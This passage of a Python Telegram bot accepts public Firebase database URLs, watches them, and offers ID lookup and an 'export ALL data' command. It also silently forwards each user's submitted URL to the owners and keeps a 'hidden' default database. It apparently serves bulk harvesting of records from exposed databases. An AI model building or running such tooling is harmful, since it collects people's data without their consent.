        help_msg = "📚 <b>Commands</b>\n\n/find <id> - Search (first 3 unique records)\n/finda <id> - Export ALL data\n/start - Welcome\n/stop - Stop monitoring\n/list - Your URLs\n/ping - Status\n/help - This message"
        send_msg(chat_id, help_msg, keyboard=get_main_keyboard(is_admin))
        return
    
    # Firebase URL
    if text.startswith("http"):
        if text == DEFAULT_FIREBASE_URL and not is_admin:
            send_msg(chat_id, "❌ Default Firebase is admin only", keyboard=get_main_keyboard(is_admin))
            return
        
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(chat_id, "❌ Cannot fetch URL. Make sure it's public", keyboard=get_main_keyboard(is_admin))
            return
        
        start_watcher(chat_id, text)
        send_msg(OWNER_IDS, f"User <code>{chat_id}</code> started monitoring:\n<code>{text}</code>")
        return
    
    # Unknown
    send_msg(chat_id, "❓ Unknown command. Use /help", keyboard=get_main_keyboard(is_admin))

# ---------- MAIN ----------
def main_loop():
    send_msg(OWNER_IDS, "🤖 Bot Started!\n✅ No duplicates\n✅ Full records\n✅ No default Firebase in results")
    print("=" * 50)
    print("🤖 BOT STARTED")
    print("✅ No duplicate results")
    print("✅ Full record display")
    print("✅ Default Firebase hidden")
    print("=" * 50)
    
    if DEFAULT_FIREBASE_ENABLED:
        time.sleep(2)
        start_default_firebase()
    
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                print("Error:", e)
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        main_loop()
    except KeyboardInterrupt:
        running = False
        print("\n🛑 Shutting down...")
    except Exception as e:
        print(f"❌ Fatal: {e}")
        send_msg(OWNER_IDS, f"❌ Bot crashed: {str(e)}")